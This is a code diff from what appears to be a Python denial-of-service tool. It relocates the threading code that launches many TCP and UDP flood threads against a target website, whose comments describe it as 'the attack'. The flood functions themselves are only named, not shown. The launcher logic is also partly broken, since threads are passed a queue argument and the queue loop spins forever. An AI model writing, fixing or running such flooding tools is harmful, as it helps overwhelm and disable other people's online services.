@@ -172,52 +172,6 @@ def generate_payload():
     # Return the payload
     return payload
 
-# Define a function to run multiple threads of the attack function
-def run_Threads():
-
-    # Create a queue object to store the tasks
-    task_queue = queue.Queue()
-
-    # For each thread, create a thread object with the attack function as target and task queue as argument
-    for i in range(Threads):
-        
-        if protocol == "TCP":
-            thread = threading.Thread(target=tcp_flood, args=(task_queue,))
-
-        elif protocol == "UDP":
-            thread = threading.Thread(target=udp_flood, args=(task_queue,))
-
-        else:
-            print("Invalid protocol.")
-            return
-
-        # Append the thread object to the list
-        
-        thread_list.append(thread)
-
-        # Start the thread
-        thread.start()
-
-    # While the queue is not empty, get a task from it and put it back to keep it alive
-    while not task_queue.empty():
-        task = task_queue.get()
-        task_queue.put(task)
-        
-        # For each thread in the list, join it to wait for completion
-    for thread in thread_list:
-        thread.join()
-
-# Create a loop to launch threads for sending requests
-for i in range(Threads):
-    # Create and start a thread object with the attack function as the target
-    threading.Thread(target=tcp_flood).start()
-
-# Create a loop to launch threads for sending requests
-for i in range(Threads):
-    # Create and start a thread object with the attack function as the target
-    
-    threading.Thread(target=udp_flood).start()
-
 # Define a function to perform the attack on the website using TCP
 def tcp_flood():
 
@@ -299,3 +253,48 @@ def udp_flood():
         # Use parentheses for print function in Python 3
         print(f'Error: {e}')
 
+# Define a function to run multiple threads of the attack function
+def run_Threads():
+
+    # Create a queue object to store the tasks
+    task_queue = queue.Queue()
+
+    # For each thread, create a thread object with the attack function as target and task queue as argument
+    for i in range(Threads):
+        
+        if protocol == "TCP":
+            thread = threading.Thread(target=tcp_flood, args=(task_queue,))
+
+        elif protocol == "UDP":
+            thread = threading.Thread(target=udp_flood, args=(task_queue,))
+
+        else:
+            print("Invalid protocol.")
+            return
+
+        # Append the thread object to the list
+        
+        thread_list.append(thread)
+
+        # Start the thread
+        thread.start()
+
+    # While the queue is not empty, get a task from it and put it back to keep it alive
+    while not task_queue.empty():
+        task = task_queue.get()
+        task_queue.put(task)
+        
+        # For each thread in the list, join it to wait for completion
+    for thread in thread_list:
+        thread.join()
+
+# Create a loop to launch threads for sending requests
+for i in range(Threads):
+    # Create and start a thread object with the attack function as the target
+    threading.Thread(target=tcp_flood).start()
+
+# Create a loop to launch threads for sending requests
+for i in range(Threads):
+    # Create and start a thread object with the attack function as the target
+    
+    threading.Thread(target=udp_flood).start()
